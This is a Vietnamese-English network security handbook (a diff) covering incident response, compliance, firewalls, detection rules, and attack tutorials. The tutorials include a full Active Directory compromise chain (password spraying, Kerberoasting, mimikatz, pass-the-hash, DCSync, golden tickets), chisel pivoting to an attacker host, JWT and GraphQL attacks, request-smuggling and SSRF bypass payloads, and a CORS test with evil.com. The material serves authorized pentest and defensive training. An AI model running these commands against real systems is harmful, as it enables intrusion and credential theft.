+```
+
+## 31.3 Network Incident Response
+
+### IR Playbooks
+
+```
+=== DDoS Response ===
+1. Identify: Traffic spike, service unavailable
+2. Classify: Volumetric / Protocol / Application
+3. Contain:
+   - Enable rate limiting
+   - Activate CDN / scrubbing service
+   - Blackhole routing (last resort)
+   - GeoIP blocking (nếu attack từ specific region)
+4. Eradicate: Work with ISP/upstream
+5. Recover: Monitor, gradually remove blocks
+6. Lessons learned: Improve DDoS protection
+
+=== Lateral Movement Detected ===
+1. Identify: Unusual SMB/WinRM/RDP connections, PtH attempts
+2. Contain:
+   - Isolate compromised host (VLAN quarantine hoặc disable switch port)
+   - Block lateral movement at firewall
+   - Disable compromised accounts
+   - Reset Kerberos tickets (krbtgt reset 2 lần)
+3. Eradicate: Clean compromised hosts, patch vulnerability
+4. Recover: Re-enable services, monitor closely
+
+=== Containment Strategies ===
+VLAN Isolation: Move compromised host to quarantine VLAN
+ACL Quarantine: Block specific traffic at firewall/switch
+DNS Sinkholing: Redirect malicious domains to internal server
+Port Shutdown: Disable switch port of compromised device
+Network Segment Disconnection: Isolate entire segment
+```
+
+## 31.4 Threat Intelligence
+
+```
+=== IOC Types ===
+Network IOCs:
+  - IP address (C2 server, scanner)
+  - Domain (phishing, C2)
+  - URL (malware download, phishing page)
+  - JA3/JA3S hash (TLS client/server fingerprint)
+  - User-Agent string
+
+Host IOCs:
+  - File hash (MD5, SHA1, SHA256)
+  - File path
+  - Registry key
+  - Mutex name
+  - Process name
+
+=== Threat Feeds ===
+AlienVault OTX:  https://otx.alienvault.com (free, community)
+Abuse.ch:        https://abuse.ch (malware, botnet, SSL blacklist)
+VirusTotal:      https://virustotal.com (file/URL/IP analysis)
+ThreatFox:       https://threatfox.abuse.ch (IOC database)
+URLhaus:         https://urlhaus.abuse.ch (malicious URLs)
+
+=== STIX / TAXII ===
+STIX (Structured Threat Information eXpression):
+  JSON format cho threat intelligence sharing
+  Objects: Indicator, Malware, Attack Pattern, Campaign, Threat Actor
+
+TAXII (Trusted Automated eXchange of Indicator Information):
+  Transport protocol cho STIX data
+  Collections: Channel, Discovery, API Root
+
+# Dùng trong SIEM: Import threat feeds → auto-correlate với logs
+```
+
+## 31.5 Forensics - Chain of Custody
+
+```
+Quy trình thu thập evidence:
+1. Identify: Xác định evidence (logs, pcap, disk image, memory)
+2. Preserve: Tạo forensic copy (bit-for-bit)
+   - Write blocker cho disk
+   - dd hoặc FTK Imager
+3. Document: Ghi chép mỗi bước
+   - Ai thu thập, khi nào, ở đâu
+   - Hash (SHA256) của evidence
+   - Mỗi lần transfer → sign off
+4. Analyze: Phân tích trên COPY, không bao giờ trên original
+5. Present: Report findings
+
+# Tạo forensic image
+dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
+sha256sum /dev/sda > /evidence/disk.img.sha256
+sha256sum /evidence/disk.img >> /evidence/disk.img.sha256
+# So sánh 2 hash phải giống nhau
+```
+
+---
+
+# PHẦN 32: NETWORK AUTOMATION & COMPLIANCE
+
+## 32.1 Ansible for Network
+
+```yaml
+# Ansible automate cấu hình network devices
+
+# inventory.yml
+all:
+  children:
+    switches:
+      hosts:
+        sw1:
+          ansible_host: 192.168.1.10
+          ansible_network_os: cisco.ios.ios
+          ansible_connection: network_cli
+          ansible_user: admin
+          ansible_password: password
+
+# playbook: configure_switch.yml
+- name: Configure switch security
+  hosts: switches
+  tasks:
+    - name: Disable unused ports
+      cisco.ios.ios_interfaces:
+        config:
+          - name: GigabitEthernet0/10
+            enabled: false
+          - name: GigabitEthernet0/11
+            enabled: false
+
+    - name: Configure port security
+      cisco.ios.ios_config:
+        lines:
+          - switchport port-security
+          - switchport port-security maximum 2
+          - switchport port-security violation restrict
+        parents: interface GigabitEthernet0/1
+
+    - name: Enable DHCP snooping
+      cisco.ios.ios_config:
+        lines:
+          - ip dhcp snooping
+          - ip dhcp snooping vlan 10,20
+
+# Run:
+ansible-playbook -i inventory.yml configure_switch.yml
+```
+
+### Terraform for Network Infrastructure
+
+```hcl
+# AWS VPC + Security Groups
+
+resource "aws_vpc" "main" {
+  cidr_block = "10.0.0.0/16"
+  enable_dns_support = true
+  enable_dns_hostnames = true
+}
+
+resource "aws_security_group" "web" {
+  vpc_id = aws_vpc.main.id
+
+  ingress {
+    from_port   = 443
+    to_port     = 443
+    protocol    = "tcp"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+
+  ingress {
+    from_port   = 22
+    to_port     = 22
+    protocol    = "tcp"
+    cidr_blocks = ["10.0.0.0/16"]  # SSH chỉ từ internal
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 0
+    protocol    = "-1"
+    cidr_blocks = ["0.0.0.0/0"]
+  }
+}
+
+# IaC Security:
+# Checkov, tfsec: Scan Terraform cho misconfigurations
+# OPA (Open Policy Agent): Policy-as-code enforcement
+# Drift detection: terraform plan → phát hiện manual changes
+```
+
+## 32.2 Compliance
+
+### PCI DSS (Payment Card Industry)
+
+```
+Network Requirements:
+  Req 1: Install and maintain firewall
+    - DMZ for public-facing systems
+    - No direct Internet → cardholder data environment
+    - Personal firewall on mobile/employee devices
+  Req 2: Do not use vendor-supplied defaults
+    - Change default passwords
+    - Disable unnecessary services
+  Req 4: Encrypt transmission of cardholder data
+    - TLS 1.2+ for public networks
+  Req 10: Track and monitor all access
+    - Log all access to cardholder data
+    - Retain logs 1 year, 3 months immediately available
+  Req 11: Regularly test security
+    - Quarterly vulnerability scans (ASV)
+    - Annual penetration test
+    - IDS/IPS monitoring
+
+# Network Segmentation: REQUIRED to reduce scope
+# Only systems that store/process/transmit card data = in scope
+# Proper segmentation → rest of network out of scope
+```
+
+### ISO 27001 (Annex A - Network Controls)
+
+```
+A.13.1 Network Security Management:
+  A.13.1.1: Network controls (firewall, IDS, segmentation)
+  A.13.1.2: Security of network services (SLAs, monitoring)
+  A.13.1.3: Segregation in networks (VLAN, DMZ)
+
+A.13.2 Information Transfer:
+  A.13.2.1: Transfer policies (encryption, approved methods)
+  A.13.2.3: Electronic messaging security (email encryption)
+```
+
+### SOC 2 (Trust Service Criteria)
+
+```
+CC6: Logical and Physical Access Controls
+  - Network segmentation
+  - Firewall rules review
+  - VPN for remote access
+  - MFA for privileged access
+
+CC7: System Operations
+  - Monitoring and detection (SIEM)
+  - Incident response procedures
+  - Vulnerability management
+
+CC8: Change Management
+  - Network change approval process
+  - Firewall rule change documentation
+```
+
+## 32.3 SD-WAN & SASE
+
+```
+=== SD-WAN (Software-Defined WAN) ===
+Overlay network trên multiple WAN links (MPLS, broadband, LTE)
+
+Architecture:
+  Underlay: Physical connections (ISP links)
+  Overlay: Encrypted tunnels (IPsec/GRE)
+  Controller: Centralized management (policy, routing)
+
+Benefits:
+  - Cheaper than MPLS
+  - Application-aware routing (Office 365 → direct Internet)
+  - Centralized management
+  - Automatic failover
+
+Security implications:
+  - Traffic goes over Internet → needs encryption
+  - Multiple paths → harder to monitor
+  - Cloud integration → need consistent policy
+
+Vendors: Cisco Viptela, Fortinet, VMware VeloCloud, Silver Peak
+
+=== SASE (Secure Access Service Edge) ===
+= SD-WAN + Cloud Security (all-in-one)
+
+Components:
+  SD-WAN:   WAN optimization
+  FWaaS:    Firewall as a Service
+  CASB:     Cloud Access Security Broker
+  ZTNA:     Zero Trust Network Access
+  SWG:      Secure Web Gateway
+
+→ Single cloud service cho cả networking + security
+→ Edge-based (close to user, not datacenter)
+→ Identity-based access (not IP-based)
+
+Vendors: Zscaler, Palo Alto Prisma, Cloudflare One, Netskope
+
+# Khi nào dùng:
+# Remote workforce lớn
+# Multi-cloud environment
+# Branch offices without on-prem security stack
+```
+
+## 32.4 Microsegmentation Implementation
+
+```
+Microsegmentation: Firewall từng workload (không chỉ subnet)
+
+Traditional Segmentation:
+  [VLAN 10] ←firewall→ [VLAN 20]
+  Trong cùng VLAN → tất cả trust nhau → lateral movement dễ
+
+Microsegmentation:
+  Mỗi VM/container có policy riêng
+  Workload A chỉ nói chuyện được với Workload B trên port 443
+  Mọi traffic khác → deny
+
+Tools:
+  VMware NSX: Distributed firewall per VM
+  Illumio: Agent-based, application-aware
+  Guardicore (Akamai): Agent + network-based
+  Cilium: eBPF-based cho Kubernetes (xem Phần 23)
+
+Implementation steps:
+  1. Discover: Map tất cả communication flows
+  2. Visualize: Dependency map (ai nói chuyện với ai)
+  3. Policy: Define allowed flows
+  4. Test: Monitor mode trước (alert, không block)
+  5. Enforce: Block unauthorized flows
+  6. Maintain: Continuous monitoring + policy updates
+```
+
+---
+
+# PHẦN 33: UFW, FIREWALLD & SUPPLEMENTAL FIREWALLS
+
+## 33.1 UFW (Uncomplicated Firewall) - Ubuntu/Debian
+
+```bash
+# UFW = Frontend đơn giản cho iptables
+
+# Bật/tắt
+sudo ufw enable
+sudo ufw disable
+sudo ufw status verbose
+
+# Default policy
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+
+# Cho phép services
+sudo ufw allow ssh                    # Port 22
+sudo ufw allow http                   # Port 80
+sudo ufw allow https                  # Port 443
+sudo ufw allow 8080/tcp
+
+# Cho phép từ IP cụ thể
+sudo ufw allow from 192.168.1.100
+sudo ufw allow from 192.168.1.0/24 to any port 22
+
+# Deny
+sudo ufw deny from 10.10.10.100
+
+# Delete rule
+sudo ufw delete allow 8080/tcp
+sudo ufw status numbered
+sudo ufw delete 3                     # Xóa rule số 3
+
+# Rate limiting (SSH brute force protection)
+sudo ufw limit ssh
+
+# Application profiles
+sudo ufw app list
+sudo ufw allow 'Nginx Full'
+
+# Logging
+sudo ufw logging on
+sudo ufw logging high
+# Logs: /var/log/ufw.log
+```
+
+## 33.2 firewalld (CentOS/RHEL/Fedora)
+
+```bash
+# firewalld dùng zones thay vì chains
+
+# Status
+sudo firewall-cmd --state
+sudo firewall-cmd --list-all
+
+# Zones: drop, block, public, external, dmz, work, home, internal, trusted
+sudo firewall-cmd --get-zones
+sudo firewall-cmd --get-active-zones
+sudo firewall-cmd --get-default-zone
+
+# Thêm service
+sudo firewall-cmd --zone=public --add-service=http --permanent
+sudo firewall-cmd --zone=public --add-service=https --permanent
+
+# Thêm port
+sudo firewall-cmd --zone=public --add-port=8080/tcp --permanent
+
+# Rich rules (nâng cao)
+sudo firewall-cmd --zone=public --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" port port="22" protocol="tcp" accept' --permanent
+
+# Block IP
+sudo firewall-cmd --zone=public --add-rich-rule='rule family="ipv4" source address="10.10.10.100" drop' --permanent
+
+# Port forwarding
+sudo firewall-cmd --zone=public --add-forward-port=port=80:proto=tcp:toport=8080 --permanent
+
+# Masquerading (NAT)
+sudo firewall-cmd --zone=public --add-masquerade --permanent
+
+# Reload (apply permanent changes)
+sudo firewall-cmd --reload
+
+# Runtime vs Permanent:
+# Không có --permanent → chỉ tồn tại đến reboot
+# Có --permanent → cần --reload để apply
+```
+
+---
+
+# PHẦN 34: BLUE TEAM - DETECTION SIGNATURES
+
+> Mỗi kỹ thuật tấn công đều có dấu vết. Phần này dạy bạn PHÁT HIỆN chúng.
+
+## 34.1 Windows Event IDs quan trọng
+
+```
+Event ID   Log           Ý nghĩa
+─────────  ────────────  ──────────────────────────────────────
+4624       Security      Logon thành công
+4625       Security      Logon thất bại (brute force indicator)
+4648       Security      Logon with explicit credentials (runas, PsExec)
+4672       Security      Special privileges assigned (admin logon)
+4720       Security      User account created
+4732       Security      User added to local group
+4768       Security      Kerberos TGT requested (AS-REQ)
+4769       Security      Kerberos service ticket requested (TGS-REQ) → Kerberoasting
+4771       Security      Kerberos pre-authentication failed → AS-REP Roasting
+4776       Security      NTLM authentication (credential validation)
+5140       Security      Network share accessed
+5145       Security      Detailed file share access
+7045       System        New service installed → persistence / PsExec
+4688       Security      Process created (cần enable command line logging)
+4698       Security      Scheduled task created → persistence
+1102       Security      Audit log cleared → anti-forensics!
+4662       Security      Directory service object accessed → DCSync
+4742       Security      Computer account changed → ZeroLogon / noPac
+
+Sysmon Events (cần install Sysmon):
+1    Process Create (with command line + parent process + hash)
+3    Network Connection (process → IP:port)
+7    Image Loaded (DLL loading)
+8    CreateRemoteThread (process injection)
+10   Process Accessed (credential dumping: lsass.exe)
+11   File Created
+13   Registry modification
+22   DNS Query
+```
+
+## 34.2 Detection per Attack Technique
+
+```
+=== Kerberoasting Detection ===
+Event: 4769 (TGS-REQ) với Ticket Encryption Type = 0x17 (RC4)
+       cho nhiều SPNs từ cùng 1 user trong thời gian ngắn
+Sigma rule:
+  logsource: windows/security
+  detection:
+    selection:
+      EventID: 4769
+      TicketEncryptionType: '0x17'
+      ServiceName|endswith: '$'    # exclude machine accounts
+    condition: selection | count(ServiceName) by TargetUserName > 5
+    timeframe: 1h
+
+=== AS-REP Roasting Detection ===
+Event: 4768 với Result Code = 0x0 (success)
+       VÀ Ticket Encryption Type = 0x17 (RC4)
+       cho user có "Do not require pre-auth" enabled
+
+=== DCSync Detection ===
+Event: 4662 với Properties chứa:
+  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes)
+  {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  (DS-Replication-Get-Changes-All)
+VÀ Subject không phải Domain Controller
+→ Non-DC requesting replication = DCSync!
+
+=== Pass-the-Hash Detection ===
+Event: 4624 với Logon Type 3 (Network)
+       VÀ Authentication Package = NTLM
+       VÀ Source ≠ expected workstation
+
+=== Golden Ticket Detection ===
+Event: 4769 với Account Domain = blank/mismatch
+       VÀ ticket lifetime bất thường (mặc định 10 năm cho golden ticket)
+
+=== PsExec Detection ===
+Event: 7045 (Service installed) + 5145 (Share access to ADMIN$)
+       Service name: random letters hoặc "PSEXESVC"
+       Sysmon Event 1: process parent = services.exe
+
+=== Responder / LLMNR Poisoning Detection ===
+Sysmon Event 22: DNS query for WPAD
+Network: LLMNR response từ non-DNS server IP
+Event: 4648 (explicit credentials) đến unusual IP
+
+=== ARP Spoofing Detection ===
+Wireshark: arp.duplicate-address-detected
+Network monitoring: Cùng IP → nhiều MAC addresses khác nhau
+Tool: arpwatch alerts
+
+=== Lateral Movement (WinRM/WMI) ===
+Event: 4624 Logon Type 3 + 4648 explicit credentials
+WinRM: Event 91 (WSMan session created)
+WMI: Event 5857 (WMI activity) + Sysmon Event 1 (wmiprvse.exe parent)
+
+=== Data Exfiltration via DNS ===
+DNS query length > 50 characters
+High volume DNS TXT requests
+DNS queries to unusual TLDs
+Subdomain entropy analysis (random = suspicious)
+```
+
+## 34.3 Sigma Rules & SIEM Queries
+
+```bash
+# === Splunk: Detect brute force ===
+index=wineventlog EventCode=4625
+| stats count by src_ip, TargetUserName
+| where count > 10
+| sort -count
+
+# === Splunk: Detect Kerberoasting ===
+index=wineventlog EventCode=4769 TicketEncryptionType=0x17
+| stats count by TargetUserName, ServiceName
+| where count > 3
+
+# === Splunk: Detect PsExec ===
+index=wineventlog (EventCode=7045 ServiceName="PSEXESVC")
+OR (EventCode=5145 ShareName="\\\\*\\ADMIN$")
+
+# === ELK/Kibana: Detect DCSync ===
+event.code: 4662 AND winlog.event_data.Properties: *1131f6ad*
+AND NOT winlog.event_data.SubjectUserName: *$
+
+# === Sigma rule file format ===
+title: Kerberoasting Activity
+status: experimental
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4769
+    TicketEncryptionType: '0x17'
+  filter:
+    ServiceName|endswith: '$'
+  condition: selection and not filter
+  timeframe: 1h
+  count(ServiceName) by TargetUserName > 5
+level: high
+tags:
+  - attack.credential_access
+  - attack.t1558.003
+```
+
+---
+
+# PHẦN 35: COMPLETE ATTACK CHAINS
+
+> Các kỹ thuật riêng lẻ → chuỗi tấn công hoàn chỉnh.
+> **CHỈ DÙNG TRONG AUTHORIZED PENTEST.**
+
+## 35.1 External to Domain Admin - Full Chain
+
+```
+Scenario: Pentest external → internal network → Domain Admin
+
+═══════════════════════════════════════════════════════
+PHASE 1: EXTERNAL RECON
+═══════════════════════════════════════════════════════
+
+# Subdomain enumeration
+subfinder -d target.com -silent -o subs.txt
+amass enum -passive -d target.com >> subs.txt
+sort -u subs.txt -o subs.txt
+
+# Check alive
+cat subs.txt | httpx -silent -status-code -title -tech-detect -o alive.txt
+
+# Certificate transparency
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Port scan exposed assets
+nmap -sS -sV -sC --top-ports 1000 -oA external_scan target.com
+
+# Google dorks
+# site:target.com filetype:pdf
+# site:target.com inurl:admin
+# site:target.com ext:conf|env|log
+
+# Shodan
+# org:"Target Company"
+
+═══════════════════════════════════════════════════════
+PHASE 2: INITIAL FOOTHOLD
+═══════════════════════════════════════════════════════
+
+# Scenario A: Web app vulnerability (SSRF → internal access)
+# Tìm SSRF → truy cập metadata service:
+# http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Scenario B: VPN/RDP exposed
+# Password spray (1 password, many users)
+crackmapexec smb vpn.target.com -u users.txt -p 'Spring2024!' --no-bruteforce
+
+# Scenario C: Phishing
+# Evilginx2 → capture session cookie → bypass MFA
+
+# Kết quả: Có 1 user account trên internal network
+# user: jsmith, pass: Spring2024!
+
+═══════════════════════════════════════════════════════
+PHASE 3: INTERNAL ENUMERATION
+═══════════════════════════════════════════════════════
+
+# Network discovery
+nmap -sn 10.10.10.0/24
+crackmapexec smb 10.10.10.0/24
+
+# BloodHound data collection
+bloodhound-python -u jsmith -p 'Spring2024!' -d target.com -c All -ns 10.10.10.1
+
+# Import vào BloodHound → tìm attack path to Domain Admin
+
+# Enumerate shares
+crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Spring2024!' --shares
+
+# Responder (parallel - capture hashes)
+sudo responder -I eth0 -wrf
+
+═══════════════════════════════════════════════════════
+PHASE 4: PRIVILEGE ESCALATION
+═══════════════════════════════════════════════════════
+
+# Kerberoast (tìm service accounts với weak password)
+GetUserSPNs.py target.com/jsmith:'Spring2024!' -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+# → Crack được: svc_backup / Backup2023!
+
+# svc_backup có Backup Operators privileges → DCSync rights!
+
+═══════════════════════════════════════════════════════
+PHASE 5: LATERAL MOVEMENT
+═══════════════════════════════════════════════════════
+
+# WinRM access với svc_backup
+evil-winrm -i 10.10.10.50 -u svc_backup -p 'Backup2023!'
+
+# Dump credentials từ target host
+mimikatz> sekurlsa::logonpasswords
+# → Tìm được NTLM hash của domain admin đang logged in
+
+# Pass-the-Hash đến Domain Controller
+psexec.py -hashes :da_ntlm_hash target.com/da_admin@10.10.10.1
+
+═══════════════════════════════════════════════════════
+PHASE 6: DOMAIN DOMINANCE
+═══════════════════════════════════════════════════════
+
+# DCSync → dump tất cả credentials
+secretsdump.py target.com/da_admin@10.10.10.1 -hashes :da_ntlm_hash -just-dc-ntlm
+
+# Golden Ticket (persistence)
+ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain target.com Administrator
+
+═══════════════════════════════════════════════════════
+PHASE 7: EVIDENCE & REPORTING
+═══════════════════════════════════════════════════════
+
+# Screenshot everything
+# Document each step with timestamps
+# Clean up: Remove tools, close sessions
+# Write report: Executive summary + Technical findings + Remediation
+```
+
+## 35.2 Multi-Network Pivot Scenario
+
+```bash
+# Network layout:
+# Attacker (10.10.14.5) → DMZ (10.10.10.0/24) → Internal (172.16.0.0/24) → Management (192.168.100.0/24)
+
+# ═══ Step 1: Compromise DMZ host ═══
+# Exploit web app on 10.10.10.100
+# Get reverse shell
+
+# ═══ Step 2: Enumerate from DMZ ═══
+# On compromised host:
+ip addr show    # Find second NIC: 172.16.0.10
+for i in $(seq 1 254); do ping -c 1 -W 1 172.16.0.$i &>/dev/null && echo "172.16.0.$i alive"; done
+
+# ═══ Step 3: Pivot to Internal ═══
+# Upload chisel to DMZ host
+# Attacker:
+chisel server --reverse --port 8080
+# DMZ host:
+./chisel client 10.10.14.5:8080 R:socks
+
+# Scan internal via proxy
+proxychains nmap -sT -Pn -p 22,80,445,3389,5985 172.16.0.0/24
+
+# ═══ Step 4: Lateral move in Internal ═══
+proxychains evil-winrm -i 172.16.0.50 -u admin -p 'password'
+# Find third NIC: 192.168.100.10
+
+# ═══ Step 5: Double pivot to Management ═══
+# On internal host, start second chisel client
+# Or use ligolo-ng for cleaner multi-hop
+
+# Attacker setup ligolo:
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 172.16.0.0/24 dev ligolo
+sudo ligolo-proxy -selfcert
+
+# Agent on DMZ → proxy
+# Add second route: sudo ip route add 192.168.100.0/24 dev ligolo
+# Start second agent on internal host → proxy
+
+# Now attacker can directly reach 192.168.100.0/24!
+nmap -sV 192.168.100.1    # Management switch/firewall
+```
+
+---
+
+# PHẦN 36: API SECURITY & BUG BOUNTY
+
+## 36.1 API Security
+
+### REST API Enumeration
+
+```bash
+# Tìm API endpoints
+# Kiểm tra: /api, /api/v1, /api/v2, /graphql, /swagger, /openapi.json
+ffuf -w /usr/share/wordlists/api-endpoints.txt -u http://target.com/FUZZ
+
+# Swagger/OpenAPI discovery
+curl http://target.com/swagger.json
+curl http://target.com/openapi.json
+curl http://target.com/v2/api-docs    # Spring Boot
+
+# API fuzzing
+ffuf -w params.txt -u "http://target.com/api/users?FUZZ=test" -fc 400
+
+# HTTP method testing
+for method in GET POST PUT DELETE PATCH OPTIONS; do
+  echo -n "$method: "; curl -s -o /dev/null -w "%{http_code}" -X $method http://target.com/api/users
+  echo
+done
+
+# IDOR testing (thay đổi ID)
+# GET /api/users/100  → data của user 100
+# GET /api/users/101  → data của user 101 (nếu thấy = IDOR!)
+```
+
+### JWT (JSON Web Token) Attacks
+
+```bash
+# JWT format: header.payload.signature (Base64URL encoded)
+
+# === None Algorithm Attack ===
+# Đổi alg thành "none" → server skip verification
+# Original: {"alg":"HS256","typ":"JWT"}
+# Modified: {"alg":"none","typ":"JWT"}
+# Tool: jwt_tool
+python3 jwt_tool.py TOKEN -X a    # Test alg:none
+
+# === Key Confusion (RS256 → HS256) ===
+# Server dùng RS256 (asymmetric), đổi sang HS256 (symmetric)
+# Sign JWT bằng public key (ai cũng có) → server verify bằng cùng public key → valid!
+python3 jwt_tool.py TOKEN -X k -pk public_key.pem
+
+# === Brute force secret ===
+hashcat -m 16500 jwt.txt wordlist.txt
+# hoặc
+python3 jwt_tool.py TOKEN -C -d wordlist.txt
+
+# === JWT common claims to modify ===
+# sub: user ID (change for privilege escalation)
+# role/admin: true/false
+# exp: expiration (extend)
+# iss: issuer (bypass if not validated)
+
+# jwt_tool all-in-one
+python3 jwt_tool.py TOKEN -M at    # Test ALL known attacks
+```
+
+### GraphQL Attacks
+
+```bash
+# === Introspection Query (Discovery) ===
+# Lấy TOÀN BỘ schema (types, queries, mutations)
+curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name,fields{name,args{name}}}}}"}'
+
+# Full introspection
+curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
+  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{...FullType}}}fragment FullType on __Type{kind name fields(includeDeprecated:true){name args{name type{...TypeRef}}type{...TypeRef}}inputFields{name type{...TypeRef}}}fragment TypeRef on __Type{kind name ofType{kind name}}"}'
+
+# Tools: graphql-voyager (visualization), InQL (Burp extension), graphw00f
+
+# === Batch Query Attack ===
+# GraphQL cho phép nhiều query trong 1 request
+# → Brute force, enumeration nhanh hơn rate limit
+[
+  {"query":"{ user(id:1) { email } }"},
+  {"query":"{ user(id:2) { email } }"},
+  {"query":"{ user(id:3) { email } }"}
+]
+
+# === Injection ===
+# query { user(name: "admin' OR '1'='1") { id email } }
+
+# === Denial of Service ===
+# Deep nested query → resource exhaustion
+# { user { friends { friends { friends { ... } } } } }
+```
+
+### OAuth2 Attacks
+
+```
+OAuth2 Flows:
+  Authorization Code: Server-side apps (most secure)
+  Implicit: SPA (deprecated, token in URL)
+  Client Credentials: Server-to-server
+  PKCE: Mobile/SPA (recommended)
+
+Attacks:
+1. Authorization Code Interception:
+   - Redirect URI manipulation: change redirect_uri to attacker
+   - Open redirect on allowed redirect_uri → steal code
+
+2. CSRF on OAuth:
+   - Missing state parameter → attacker links victim's account to attacker's
+
+3. Token Leakage:
+   - Implicit flow: token in URL fragment → browser history, referrer header
+   - Authorization code in server logs
+
+4. Scope escalation:
+   - Request higher scope than authorized
+
+5. PKCE bypass:
+   - Server doesn't validate code_verifier
+   - Downgrade from S256 to plain
+```
+
+## 36.2 Bug Bounty Network Techniques
+
+### Subdomain Takeover
+
+```bash
+# Nguyên lý: CNAME trỏ đến service đã bỏ (S3, Heroku, GitHub Pages, etc.)
+# → Claim service → control subdomain content
+
+# Step 1: Find CNAME records
+dig CNAME sub.target.com
+# Nếu trả về: sub.target.com CNAME xxxx.herokuapp.com
+# VÀ xxxx.herokuapp.com = NXDOMAIN (không tồn tại)
+# → Vulnerable!
+
+# Step 2: Check with tools
+subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json
+nuclei -l subs.txt -t takeovers/
+
+# Vulnerable services:
+# AWS S3: "NoSuchBucket"
+# GitHub Pages: "There isn't a GitHub Pages site here"
+# Heroku: "No such app"
+# Azure: "NXDOMAIN on *.azurewebsites.net"
+# Shopify: "Sorry, this shop is currently unavailable"
+```
+
+### HTTP Request Smuggling
+
+```
+Nguyên lý: Frontend (reverse proxy/CDN) và backend parse HTTP request khác nhau
+→ "Smuggle" 1 request bên trong 1 request khác
+
+=== CL.TE (Content-Length vs Transfer-Encoding) ===
+Frontend dùng Content-Length, Backend dùng Transfer-Encoding:
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+Frontend thấy: 1 request, 13 bytes body
+Backend thấy: chunked body ends at "0\r\n\r\n", "SMUGGLED" = start of NEXT request!
+
+=== TE.CL ===
+Frontend dùng Transfer-Encoding, Backend dùng Content-Length:
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+=== Detection ===
+# Burp Suite extension: HTTP Request Smuggler
+# smuggler.py tool
+python3 smuggler.py -u http://target.com
+
+# Impact: Cache poisoning, bypass security controls, credential theft
+```
+
+### CORS Misconfiguration
+
+```bash
+# Test CORS
+curl -s -H "Origin: https://evil.com" -I http://target.com/api/data
+
+# Vulnerable if response has:
+# Access-Control-Allow-Origin: https://evil.com
+# Access-Control-Allow-Credentials: true
+# → evil.com can read authenticated API responses!
+
+# Common misconfigs:
+# Reflect any Origin header → full CORS bypass
+# Allow null origin → iframe sandbox attack
+# Wildcard + credentials → browser blocks, but shows misconfigured mindset
+# Regex bypass: evil-target.com matches .*target.com
+
+# Exploit: Host JS on evil.com that fetches victim's API with credentials
+```
+
+### SSRF (Server-Side Request Forgery)
+
+```bash
+# Truy cập internal resources qua server-side request
+
+# Cloud metadata
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+
+# Internal services
+http://localhost:8080/admin
+http://127.0.0.1:6379/   # Redis
+http://internal-db:3306/   # MySQL
+
+# Bypass filters
+http://127.0.0.1 → http://0x7f000001
+http://127.0.0.1 → http://2130706433  (decimal)
+http://127.0.0.1 → http://017700000001 (octal)
+http://127.0.0.1 → http://0177.0.0.1
+http://127.0.0.1 → http://[::1]  (IPv6)
+http://127.0.0.1 → http://127.1
+http://127.0.0.1 → http://0.0.0.0
+
+# DNS rebinding: Domain resolves to external IP first (passes filter),
+# then resolves to 127.0.0.1 on second request (server fetches internal)
+```
+
+---
+
+# PHẦN 37: CTF NETWORK TIPS
+
+## 37.1 Port Knocking
+
+```bash
+# Server ẩn port (ví dụ SSH), chỉ mở sau khi nhận đúng sequence of packets
+
+# Client knock
+knock target.com 7000 8000 9000          # Tool: knock
+# Hoặc manual:
+for port in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $port target.com; done
+# Sau knock → port 22 mở → SSH vào
+
+# Detect port knocking config:
+# Tìm file /etc/knockd.conf trên target
+# [SSH]
+# sequence    = 7000,8000,9000
+# command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+```
+
+## 37.2 PCAP Analysis cho CTF
+
+```bash
+# === Workflow ===
+# 1. Mở pcap trong Wireshark
+# 2. Statistics → Protocol Hierarchy (xem protocols nào có)
+# 3. Statistics → Conversations (xem ai nói chuyện với ai)
+# 4. Statistics → Endpoints (list IPs)
+
+# === Tìm flag trong pcap ===
+
+# Tìm string
+strings capture.pcap | grep -i "flag\|ctf\|key"
+tshark -r capture.pcap -Y 'frame contains "flag"' -T fields -e data | xxd -r -p
+
+# Extract files
+tshark -r capture.pcap --export-objects http,exported/
+tshark -r capture.pcap --export-objects smb,exported/
+tshark -r capture.pcap --export-objects tftp,exported/
+
+# DNS exfiltration reconstruction
+tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | \
+  grep ".exfil.domain" | cut -d'.' -f1 | xxd -r -p
+
+# ICMP data extraction
+tshark -r capture.pcap -Y icmp -T fields -e data | xxd -r -p
+
+# Follow all TCP streams (dump to files)
+for i in $(seq 0 100); do
+  tshark -r capture.pcap -z follow,tcp,ascii,$i 2>/dev/null > stream_$i.txt
+done
+
+# HTTP credentials
+tshark -r capture.pcap -Y 'http.request.method == POST' \
+  -T fields -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+
+# FTP credentials
+tshark -r capture.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' \
+  -T fields -e ftp.request.command -e ftp.request.arg
+
+# Wireless handshake extraction
+tshark -r capture.pcap -Y 'eapol' -T fields -e wlan.sa
